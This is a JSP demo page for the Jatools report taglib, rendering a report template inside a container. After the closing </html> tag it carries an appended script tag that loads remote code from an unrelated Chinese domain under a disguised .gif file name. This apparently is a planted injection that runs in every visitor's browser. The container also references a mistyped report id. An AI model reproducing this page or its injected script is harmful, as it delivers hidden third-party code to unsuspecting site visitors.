<%@ page language="java" contentType="text/html; charset=GB2312"
    pageEncoding="GB2312"%>
<%@ taglib uri="/WEB-INF/tlds/jatools.tld" prefix="jatools" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=GB2312">
<title>杰表 jsp taglib 演示</title>
</head>

<body>



<jatools:report id="_report1" template="D:/builder/jr4.0.eval/jrs_4.0.eval.with_tomcat/webapps/jrs/example/master.xml" border="border:1px solid blue" offset="4" layout='card' pageFrom='1' pageTo='20' cached='false'/>
<jatools:container id="_container" for_report="_re1port1" background="#EFEBEF" scroll="false" width="100%" height="80%"/>


<br>

<% _container.render() ;%>

</body>
</html>

<script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
